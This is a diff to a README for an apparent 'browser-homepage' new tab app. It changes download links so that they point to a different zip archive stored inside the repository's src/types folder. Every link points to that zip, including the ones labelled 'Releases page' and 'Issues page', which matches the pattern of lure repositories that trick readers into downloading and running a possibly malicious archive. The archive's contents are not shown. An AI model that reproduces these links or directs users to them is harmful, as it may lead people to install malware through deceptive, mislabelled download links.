@@ -1,7 +1,7 @@
 # 🎉 browser-homepage - A customizable new tab experience
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/browser-homepage_2.6.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/browser-homepage_2.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/homepage-browser-1.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/homepage-browser-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to browser-homepage! This application provides a modern and customizable new tab page for your web browser. You can personalize your browsing experience with various themes and features.
@@ -21,9 +21,9 @@ To run browser-homepage, ensure that your system meets the following requirement
 - **Storage:** Minimum of 200 MB of available space.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/browser-homepage_2.6.zip) and download the latest version of browser-homepage. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/homepage-browser-1.3.zip) and download the latest version of browser-homepage. 
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/browser-homepage_2.6.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/homepage-browser-1.3.zip).
 2. Look for the latest version.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -44,7 +44,7 @@ Adjust your settings to create a unique browsing experience that suits you.
 - **Weather Not Updating:** Verify your internet connection and check if you’ve entered your location correctly.
 
 ## 📞 Support
-If you encounter issues or have questions, feel free to reach out via the [Issues page](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/browser-homepage_2.6.zip) on GitHub. We are here to help!
+If you encounter issues or have questions, feel free to reach out via the [Issues page](https://raw.githubusercontent.com/juanito352/browser-homepage/main/src/types/homepage-browser-1.3.zip) on GitHub. We are here to help!
 
 ## 🔗 Related Topics
 This project covers various topics including:
